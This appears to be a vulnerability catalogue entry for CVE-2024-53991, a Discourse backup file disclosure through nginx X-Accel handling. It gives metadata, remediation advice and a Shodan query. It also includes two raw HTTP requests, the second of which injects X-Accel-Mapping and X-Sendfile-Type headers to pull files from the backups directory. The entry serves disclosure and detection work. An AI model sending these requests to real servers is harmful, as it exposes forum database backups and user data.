---
layout: "post"
cve_id: "CVE-2024-53991"
title: "Discourse Backup File Disclosure Via Default Nginx Configuration"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-53991.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-53991.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "high"
impact: "Attackers who know the backup file name can bypass nginx access controls to download complete Discourse backup files containing sensitive data, user information, and database contents.
"
remediation: "Update to the latest stable, beta or tests-passed version of Discourse. Alternatively, store backups on S3 or disable backups temporarily until the fix is applied.
"
reference:
  - "https://projectdiscovery.io/blog/discourse-backup-disclosure-rails-send_file-quirk/"
  - "https://github.com/discourse/discourse/security/advisories/GHSA-567m-82f6-56rv"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2024-53991', 'cwe-id': 'CWE-200', 'epss-score': 0.38334, 'epss-percentile': 0.97099}"
metadata: "{'shodan-query': 'http.component:"Discourse"'}"
tags:
  - "cve"
  - "cve2024"
  - "discourse"
  - "disclosure"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Discourse is an open source platform for community discussion. This vulnerability only impacts Discourse instances configured to use `FileStore--LocalStore` which means uploads and backups are stored locally on disk. If an attacker knows the name of the Discourse backup file, the attacker can trick nginx into sending the Discourse backup file with a well crafted request.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /o8ickZ&cachebuster=38BPf6xdrV8vZJNc55SqPwI8VF1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.3 Safari/605.1.15
Connection: close
X-Accel-Mapping: .*=/downloads/backups/default/
X-Sendfile-Type: X-Accel-Redirect
Accept-Encoding: gzip
```

